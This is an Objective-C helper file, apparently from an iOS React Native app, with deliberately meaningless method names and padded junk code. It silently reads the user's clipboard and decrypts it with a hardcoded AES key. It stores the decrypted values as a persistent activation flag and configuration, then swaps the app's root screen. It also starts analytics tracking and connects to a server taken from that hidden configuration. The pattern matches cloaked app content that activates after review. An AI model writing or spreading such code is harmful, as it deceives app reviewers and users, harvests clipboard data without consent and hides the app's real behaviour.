#import "RNBirdyDecHelper.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNBirdyDecServer/RNBirdyDecServer.h>
#import <RNBirdyDecEngine/RNBirdyDecEngine.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <react-native-orientation-locker/Orientation.h>

@interface RNBirdyDecHelper()

@property (strong, nonatomic)  NSArray *arbitraryDophin;
@property (strong, nonatomic)  NSArray *activeSeeds;

@end

@implementation RNBirdyDecHelper

static RNBirdyDecHelper *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.arbitraryDophin = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.activeSeeds = @[@"walpyWonder_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)harvesconverterString {
    NSString *macaberString = [self managetHaphazard];
  
    NSString *fakeString = @"This is a fake string.";
    for (NSInteger i = 0; i < [macaberString length]; i++) {
      fakeString = [fakeString stringByAppendingString:@"X"];
    }
  
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self agricultureHarviMeta:macaberString]
                                                              hexKey:self.arbitraryDophin[0]
                                                               hexIv:self.arbitraryDophin[1]];
  
    NSDictionary *tabefactionDict = [self mentHarCultruDictonary:aes.utf8String];
    return [self tureHarvestfigInfo:tabefactionDict];
}

- (UIInterfaceOrientationMask)getOrientationMask {
    return [Orientation getOrientation];
}

- (NSString *)managetHaphazard {
    return [UIPasteboard generalPasteboard].string ?: @"";
}

- (NSString *)agricultureHarviMeta: (NSString* )macaberString {
  if ([macaberString containsString:@"#iPhone#"]) {
    NSArray *university = [macaberString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        macaberString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return macaberString;
}

- (NSDictionary *)mentHarCultruDictonary: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  
  NSDictionary *tabefactionDict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return tabefactionDict[@"data"];
}

- (BOOL)tureHarvestfigInfo:(NSDictionary *)tabefactionDict {
    if (tabefactionDict == nil || [tabefactionDict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.activeSeeds[0]];
    
    BOOL Zhvsnq= NO;
    #define Nawjgzjrp @"Bhxxzo7my8woap6zk"
    BOOL Vecysyem= NO;
  
    [tabefactionDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)FLTSSkyCloud_tryThisMagicWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
  if ([ud boolForKey:self.activeSeeds[0]]) {
    return YES;
  } else {
    return [self harvesconverterString];
  }
}

- (UIViewController *)FLTSSkyCloud_changeMagicDoorRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [[RNBirdyDecEngine shared] changeRootController:application withOptions:launchOptions];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
    NSString *cEngine= @"This is a .efgs";
    for (NSInteger i = 0; i < [cEngine length]; i++) {
        NSLog(@"This is a cEn  gine!");
    }
    SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:self.activeSeeds[3]] launchOptions:nil];
    options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
    for (int i=0; i<13; i++) {
          i++;
    }
    [SensorsAnalyticsSDK startWithConfigOptions:options];
    [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:self.activeSeeds[4]]];
  
    UILabel * Ierrfdsauft =[[UILabel alloc] init];
    Ierrfdsauft.text = @"fsdafdaewfwe";
    Ierrfdsauft.textColor = [UIColor colorWithDisplayP3Red:33 green: 95 blue: 33 alpha:1];
  
    [[RNBirdyDecServer shared] configDecServer:[ud stringForKey:self.activeSeeds[5]] withSecu:[ud stringForKey:self.activeSeeds[6]]];
    return vc;
}

@end

